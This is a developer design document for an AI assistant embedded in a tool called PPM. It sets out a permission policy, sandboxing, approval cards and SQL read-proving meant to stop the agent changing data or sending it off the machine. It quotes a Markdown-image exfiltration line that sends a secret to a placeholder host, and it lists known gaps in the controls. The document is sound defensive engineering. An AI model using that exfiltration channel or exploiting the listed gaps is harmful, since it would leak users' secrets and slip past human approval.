# PPM Assistant

> Part of [AI Chat & Providers](ai-chat-and-providers.md#ppm-assistant).

An AI chat that works *on PPM* rather than on a project: it sees the screen of the device the
user is chatting from, finds and reads chats, reads databases and open tabs, opens and closes
tabs, switches projects, runs Command Palette commands, and sends messages into the user's
working chats. It runs on Claude and Codex. It reads content it did not write — other chats,
database rows, terminal output — so the design rule is: **navigating and reading inside the
registered projects run unasked; anything that changes data or could carry data off the
machine asks first**, whatever mode the composer shows.

## Sessions

**A virtual project.** Assistant sessions live in the reserved project `__assistant__`
(`src/shared/assistant-project.ts`). Only the chat path resolves it — the chat WebSocket and
the `/chat` sub-router, through `resolveChatProjectPath` (`src/server/helpers/resolve-chat-project.ts`)
— so it never gets a terminal, LSP root, git surface or file tree. `projectService` refuses to
register a real project under that name, and the browser keeps it out of URLs, the project
picker and workspace sync.

**The work directory** is `<ppm dir>/assistant/<database name>` (`assistant-work-dir.ts`), one
per database file, because dev (`ppm.dev.db`) and production (`ppm.db`) share the PPM dir and
both providers list a project's sessions by working directory. One shared folder would show each
instance's Assistant chats in the other's list.

**Marking a session.** `session_metadata.assistant` (migration 57) is written when the session
is created, and copied when Codex renames the session on its first turn and when a session is
forked. `isAssistantSession` (`src/services/assistant/assistant-session.ts`) answers true on the
mark of the id, the mark of the id it migrated to, *or* the session's working directory being
the Assistant's. Losing the answer is the dangerous direction — an Assistant session read as an
ordinary one falls back to the provider default, usually bypass — so any one source is enough.
Assistant sessions never adopt a warm spare and get no tab tools.

**Permissions** ignore the composer's mode. Claude is forced to `default`, because the policy
lives in the PreToolUse hook and bypass mode installs no hook; `assistantToolDecision`
(`src/services/assistant/assistant-tool-policy.ts`) decides there, with the same check as a
`canUseTool` backstop. It allows only Read, Glob and Grep that resolve inside a registered
project and outside the private roots (`assistant-private-paths.ts`: PPM's own credential
folders plus the login and key stores common tools keep under the home folder, which matter when
a project is registered at or above home), ToolSearch, TodoWrite, and the Assistant's own MCP
tools by exact name. Everything else asks: web, shell, writes, subagents, skills, other MCP
servers, reads anywhere else. It fails closed: a path that cannot be resolved, a relative path
with no working directory, or a Windows network path (answered without touching the disk) asks.
Codex gets its own profile (below).

**The UI.** One tab type, `assistant` (`src/web/components/assistant/`): on a desktop it opens
inside a `tab-host` floating window, below `md` it stays a tab, and it belongs to no project so
it comes onto whichever grid is on screen. It holds the session list, a new-session button per
provider that `supportsAssistantSessions`, and the chat with its permission chip locked. It opens
from the Command Palette (*PPM Assistant*), an unbound keybinding (`open-assistant`) and
notifications, all through `openAssistant`.

## Isolation

The Assistant inherits none of the user's own agent setup or of ordinary chats' settings.
Settings → AI & Accounts → **PPM Assistant** (`/api/assistant/settings`, config key `assistant`,
shape and validation in `src/shared/assistant-settings.ts`) holds its default provider, a model
and effort per provider, extra instructions appended after PPM's own, and its own MCP servers.
Those servers' `env` and header values never reach a browser (the whole list is in
`SECRET_CONFIG_KEYS`), and a saved header is dropped when its server's URL moves to another
origin.

- **Claude**: the query runs with `settingSources: []` — no user or project settings, hooks,
  plugins, skills or `CLAUDE.md`, the way `completeOnce` runs — plus `strictMcpConfig`, so the
  MCP servers are exactly the Assistant's own (`assistantMcpServers`). The provider's
  *Additional Instructions* are not applied. Authentication is unaffected (it comes from
  `buildQueryEnv` and the CLI's credential store), but anything only `~/.claude/settings.json`
  provides is gone, its `env` block and `apiKeyHelper` included. The CLI is also started
  without `RIPGREP_CONFIG_PATH` (`buildQueryEnv(…, { assistantSession: true })`): Glob and
  Grep run the CLI's embedded ripgrep without `--follow`, so they skip every link below the
  folder they search (measured on the bundled CLI's ripgrep), and a ripgrep config file is the
  one thing that could turn following on. The policy still asks for Glob and Grep should the
  CLI's environment ever carry that variable; it judges the environment the CLI was started
  with, not PPM's own.
- **Codex**: a separate permission profile, `ASSISTANT_PERMISSION` (read-only sandbox,
  `untrusted` approvals), and mandatory developer instructions — a Codex too old to take them
  fails the session (`RequiredInstructionsError`) instead of running it uninstructed.
  - **A CODEX_HOME of its own.** No codex setting skips `$CODEX_HOME/AGENTS.md`
    (`project_doc_max_bytes = 0` and `instructions = ""` do not), and the same folder holds the
    user's `config.toml`, hooks, agents, plugins and skills. So an Assistant app-server runs on
    `<ppm dir>/assistant/codex-homes/<account folder>-<hash>` (`codex-assistant-home.ts`), which
    holds none of them and is joined to the account's home by two links: `auth.json` is a hard
    link to the account's file (a symlink where a hard link is refused) — codex rewrites it in
    place, so a token refreshed from either home lands in the one file instead of forking a
    rotating refresh token — and `sessions` is a junction (Windows) or directory symlink to the
    account's `sessions`, so the Assistant's rollouts are where PPM's history readers look and a
    resume finds them. The links are checked on every spawn and relinked if they no longer join
    the two files, writing a newer login found only on the Assistant's side back into the
    account's file first. Removing a Codex account deletes its Assistant home at once
    (`removeCodexAccount` → `removeAssistantCodexHome`), taking the links out before anything
    else so the delete never reaches the account's files; any home left behind is swept on the
    next Assistant spawn. Where the home cannot be set up — the account keeps no `auth.json`
    (a keyring login), or the file system refuses the links — the session runs on the account's
    own home, with a warning in the log (see Known limitations).
  - **Skills are switched off by name.** Skills under the user's home folder
    (`~/.agents/skills`) are found whatever `CODEX_HOME` says, so the catalogue is kept out of the
    prompt (`skills.include_instructions = false`), bundled skills are off, and each skill the
    app-server lists is disabled by name (`codex-assistant-skills.ts`, `skills.config`).
  - **The rest of the user's config.** `planAssistantCodexMcp` (`codex-assistant-mcp-guard.ts`)
    reads the effective config back with `config/read` — on the Assistant's own home that is
    only what codex finds outside it, and on the fallback the account's `config.toml` — and
    `assistantSessionConfig` (`codex-thread-params.ts`) disables each of those servers by name,
    turns off web search, apps, plugins, hooks and `notify`, and adds the Assistant's servers.
    An unreadable config refuses the session; so does a user server with the same name as one of
    the Assistant's, because Codex merges same-named tables key by key.
  - **Generated images** land in the Assistant home's own `generated_images`. The file guard's
    read exception for codex pictures (`isCodexGeneratedImagePath` in
    `fs-credential-path-guard.ts`) covers that folder as it covers an account home's, so the
    chat shows them; the home's `auth.json`, marker and `sessions` link stay refused.
- **Shared context**: the user's shared instructions and memories are not added to Assistant
  turns, whatever `share_provider_context` says. Only the UI summary rides in that block.
- **External resources**: Assistant Markdown never makes the browser fetch anything by itself.
  `markdown-external-resources.ts` turns external images and embeds into links and holds the
  rest to an allowlist (`markdown-assistant-allowlist.ts`), because a rendered
  `![](https://x/?k=<secret>)` would send the secret with no click and no approval.

## Tools: `/api/assistant-mcp`

One endpoint serves both providers (`src/services/assistant-mcp/assistant-mcp-endpoint.ts`,
mounted before PPM's auth). It is built on the same `mcp-http-endpoint.ts` and
`mcp-session-tokens.ts` as the tab tools: a per-session capability token, held in memory and
revoked when the session is deleted. A token is honoured only while its session — followed
through a Codex rename — is still an Assistant session, checked on every request. A tool call
lifts Bun's 10 s idle cut for its request altogether (`ASSISTANT_MCP_HOLD_OPEN_SECONDS` = 0,
Bun's "no limit"), and the providers get the longest tool timeout each holds
(`ASSISTANT_MCP_TIMEOUT_MS`, 2^31 − 1 ms ≈ 24.8 days; Codex's `tool_timeout_sec` is the same in
seconds), because an approval waits as long as the user takes. Neither provider takes "no
limit": Claude clamps a server's `timeout` to that figure, the longest a JS timer holds, and
leaving it unset is worse — an HTTP server's call is then cut after five minutes of silence. The
Claude permission hook gets the same treatment (`PERMISSION_HOOK_TIMEOUT_SECONDS`): the CLI's own
default would stop waiting for it after ten minutes, with the provider's own card still up.

Every tool that takes a project checks it against the registered projects, and every tool
taking a `sessionId` proves the session belongs to that project and is not an Assistant
session. The names, in order, are `ASSISTANT_TOOLS` in `src/shared/assistant-tool-names.ts`
(Claude spells them `mcp__ppm-assistant__<tool>`, Codex `ppm_assistant:<tool>`).

- **Read, never ask**: `projects_list`, `chat_list_sessions`, `chat_search`,
  `chat_read_messages`, `db_list_connections`, `db_query` for a proven read, `ui_get_state`,
  `ui_read_tab` (see below), `ui_list_commands`.
- **Navigate the chatting device, never ask**: `ui_open_tab`, `ui_focus_tab`,
  `ui_switch_project`, and `ui_close_tab` for a tab that loses nothing. Each answers
  `previousProject` or enough to reopen what it closed, so the agent can undo — there is no
  Undo of PPM's own.
- **Ask first**: `db_query` for anything not proven to read, `chat_send_message` (always),
  `ui_run_command` for a command declared `changesData` and for every extension command,
  `ui_close_tab` for a tab that would lose work (unsaved editor text, unsaved SQL or table edits,
  a terminal), and `ui_read_tab` for an editor's unsaved text, a terminal's output or a database
  file's rows from outside every registered project or from a credential store (below) — a file
  tab itself answers with its path, and reading the file is the provider's read tool's call.

**Reading a tab** (`assistant-tab-reader.ts`). A file tab answers with the file's absolute path
and its project, never the file: the agent reads it with its provider's own read tool, so one
rule decides every file read — Claude's `Read` under the Assistant policy (inside the projects
unasked, elsewhere and in credential stores with a card), Codex natively. What no read tool can
reach comes back from `ui_read_tab` itself, under the same rule: an editor's unsaved text, a
terminal's output, and the SQL and rows of a database tab on a SQLite file opened by path (no
saved connection, so no *Available to the AI* setting to consult) are returned unasked inside a
registered project and outside the private roots, and otherwise only after a card
(`readOutsideSummary`). PPM's own folder and paths on no local drive are refused outright,
checked before the disk is touched.

Databases follow the user's per-connection choices: a connection with *Available to the AI
chat* off (`ai_access = 0`) is neither listed, queried, opened nor read through a database tab,
and a read-only connection never runs a write, approved or not. Every statement is audited with
`actor = "agent"`.

**Old values of a write** (`assistant-write-old-rows.ts`, `assistant-sql-write-target.ts`). An
approved UPDATE or DELETE answers `{ rowsAffected, columns, oldRows, oldRowsCapped }`: the rows it
changes as they were, read by `SELECT * FROM <same table> [AS alias] [WHERE <same condition>]` on
one query session, inside the write's own transaction (`BEGIN` / `START TRANSACTION` /
SQLite's `BEGIN IMMEDIATE`, which takes the write lock the UPDATE would take anyway, only first),
immediately before it; at most 200 rows. Only the plain single-table shape is read that way —
no `FROM`/`USING`/`JOIN` or comma list, no `ONLY`, `WITH`, modifiers, `WHERE CURRENT OF`,
`ORDER BY`/`LIMIT`, `RETURNING` or nested write — and the SELECT must be provable like an
unasked read (safe-listed functions, nothing more reached by the catalog), since it re-runs the
WHERE. A WHERE that may answer differently a moment later (`random()`; the clock on MySQL and
SQLite — Postgres fixes it per transaction) is not read either. Anything else runs as typed,
with `oldRows: null` and an `oldRowsNote` saying why. No locking clause is added, so on Postgres
and MySQL a commit landing between the two statements can make the rows differ from what the
write saw; a SELECT that fails (a login allowed to UPDATE but not to SELECT) rolls back and the
write runs on its own. Only the write is audited; the SELECT is PPM's own.

## The chatting device

Only the browser knows what it shows, so the screen tools are a round trip through a device
broker (`createDeviceBroker` in `tab-open-broker.ts`, keyed by `resolveMigratedSession`) over the
chat WebSocket (`assistant_ui` / `assistant_ui_result`, `src/shared/assistant-ui-protocol.ts`).
Delivery is **strict**: `deliverToChattingDevice(…, { strict: true })` in `src/server/ws/chat.ts`
sends only to the device that sent the session's latest message. If that socket has gone, only
the same browser tab reconnected qualifies, recognised by the per-tab `clientId` it connects
with (`src/shared/chat-client-id.ts`); otherwise the call answers `no-device`. It never falls
back to every device, unlike the tab tools, because switching project or running a git pull on a
screen nobody is talking from is not harmless. The browser half is
`src/web/lib/assistant-ui/` (`answer-assistant-ui.ts` dispatches by `op`), and it answers only
for an Assistant session.

**The per-turn UI summary.** Each Assistant message carries a short picture of the sender's
screen, built in the browser (`ui-summary.ts`), validated, cleaned and capped on the server
(`assistant-ui-summary.ts`), and placed as one entry *inside* the `<ppm-shared-context>` block —
not a new tag — so the existing `stripSharedContext` keeps it out of history, titles and search.
It is sent regardless of `share_provider_context`, skipped for `/` commands, labelled as data,
and never includes tab content: the agent calls `ui_read_tab` when it needs that.

**Commands** come from one registry shared by the palette, the global keybindings and the
Assistant (`src/web/lib/commands/command-registry.ts`). Each command declares `changesData`; an
extension's command is always treated as changing data. `ui_run_command` reads that flag from
the device's own `list_commands` entry before anything runs, and only a run request built after
approval carries the `approved` marker the device requires.

## Approvals

**One card per session.** A session shows one approval card at a time, shared between the
provider's own approvals (Claude's permission hook; Codex's command and patch requests, and its
MCP tool approvals for the servers configured in Settings → PPM Assistant, which always ask) and
the endpoint's. They queue behind each
other instead of overwriting, and every way a card leaves goes through
`src/server/ws/chat-pending-approval.ts`, which finishes the request on whichever side waits for
it. Typing a message instead of answering, stopping the turn, or the turn ending withdraws an
endpoint request with that reason.

**The endpoint's broker** (`assistant-approval-broker.ts`) puts the card on every device showing
the session (it is a question, not a screen action), sends the usual approval notification, and
takes the first answer. A card waits until it is answered — shown or queued behind another,
with no time limit — or until the turn, the call or PPM itself goes away: a restart drops every
waiting request with the process, and an answer to one then gets "no longer valid" (below).
`PPM_ASSISTANT_APPROVAL_TIMEOUT_MS` sets an answer window for tests and e2e fixtures only,
counted from when the card is *shown* and held under the providers' own tool timeout. Outcomes
are approved, denied, withdrawn or unavailable (and timeout, only under that variable), and only
approved runs anything. The device broker under it arms no timer for an unbounded wait
(`createDeviceBroker`), since a delay past 2^31 − 1 ms would fire at once instead of never.

**What the card shows** is built by the server from the checked input, never from the agent's
own wording (`assistant-approval-summary.ts`): the full SQL or message, wrapped, with hidden and
bidirectional characters made visible, and for `chat_send_message` the target chat's permission
mode and where it comes from. That mode is checked again at send time and the message is not sent
if it changed. Every chat now has its permission mode stored on the server for this reason.

**Stale answers.** An `approval_response` for a request nothing holds any more — answered on
another device, ended, or from before a restart — gets `approval_stale` and "no longer valid",
never an `approval_resolved`, so a card from before a restart cannot look as if it ran.

## Proving a read

A read-only transaction is not proof that a query only reads: functions can still terminate
backends, take locks, write through another connection or sleep. So `db_query` runs unasked only
when two checks pass, and anything else goes to an approval card:

1. **The text** (`assistant-sql-safety.ts`): a plain read, no assigning `PRAGMA`, no locking
   clause, and every function called is on a short safe list (aggregates, string, date, math,
   JSON accessors, casts). A read that misses the list costs one question, by design.
2. **What the text reaches** (`assistant-sql-reach-check.ts`), asked of the catalog on the
   read-only path without planning or running the query:
   - **Postgres** (`assistant-sql-reach-postgres.ts`): views and row-level policies the query
     can reach, generated columns, domain checks, user casts, user functions named like any word
     of the query, and user operators, each judged by the same rules. `EXPLAIN` is not used, because
     planning runs user code; the file header records what was measured. Only Postgres's own
     `pg_catalog` functions are trusted: an installed extension's count as user functions, so on a
     database with citext `max(…)` asks (its aggregate shadows the safe-listed one). A user
     operator asks only where the query can make Postgres choose it, which goes by operand type:
     on that database `WHERE id = 1` and `SELECT id FROM t` run unasked, while reading a citext
     column (its output is extension code; also through `*`, a whole-row `t`, a view or a domain
     or array over it), writing the type (`::citext`, `CAST(… AS citext)`, `citext 'x'`) or using
     a user operator on a value of its type asks. An operator a built-in type can reach (one on
     `text`, a domain over a built-in, or a type with an implicit cast from one) still asks
     wherever its symbol, or a keyword standing for it (`IN`, `LIKE`, `BETWEEN`…), is written.
   - **MySQL/MariaDB** (`assistant-sql-reach-mysql.ts`): any view the query could name, or a
     stored function named like a safe-listed call, sends it to approval.
   - **SQLite**: no catalog read. A view can only call SQLite's built-ins, `load_extension()` is
     refused by bun:sqlite, and the file is opened read-only.

Any catalog error means asking, never running. A proven read then runs on the connection's
read-only path with a 60 s limit (`UNASKED_READ_TIMEOUT_MS`) and is stopped when the MCP call
closes (`src/services/database/query-stop.ts`). An approved query is the user's to run to the end.

## Known limitations

- **A waiting tool call holds its connection with no idle limit.** That is what lets an approval
  wait for the user, but a provider that vanishes without closing its TCP connection leaves the
  request waiting until the turn ends or PPM restarts; the card goes when the turn does.
- **Codex runs commands it deems safe without asking.** Under `untrusted`, its trusted read-only
  commands (`cat`, `ls`, …) run unasked and can read outside the registered projects; there is no
  per-path rule to give it. With Codex, what keeps that content on the machine is that every way
  out (web, shell beyond that set, writes, messages, MCP) asks or is off, and the read-only
  sandbox has no network (not checked by hand on Windows).
- **Codex on the account's own home gets the user's `AGENTS.md` back.** That is the fallback
  when the Assistant's home cannot be set up (an account with no `auth.json`, such as a keyring
  login, or links the file system refuses): losing the login would be worse. On the Assistant's
  own home, anything only the user's `config.toml` provides (a custom model provider, proxy
  settings) does not apply to Assistant sessions.
- **Codex skills.** If the skill list cannot be read, the catalogue still stays out of the
  prompt, but a skill the user names with `$name` in a message loads.
- **SQLite reads cannot be stopped.** bun:sqlite runs a statement synchronously with no
  interrupt, so the 60 s limit and the abort apply only before a statement starts.
- **MySQL/MariaDB**: the reach check's catalog query has been verified only by unit tests over
  sample rows, not against a live server; the Postgres one has an integration test
  (`tests/integration/assistant-sql-reach-postgres.test.ts`). The MySQL check also does not see
  loadable functions, which only an administrator installs.

## Verify

`PPM_PLAYWRIGHT_MODULE=<playwright>/index.mjs node tests/e2e/assistant-e2e.mjs` runs the
Assistant on the production bundle, on a desktop and a phone viewport, against a scripted
provider (`tests/e2e/fixtures/assistant-server.ts`) that calls the real endpoint with each turn's
token and an isolated `PPM_HOME`. The header of the test file lists its scenarios and options.
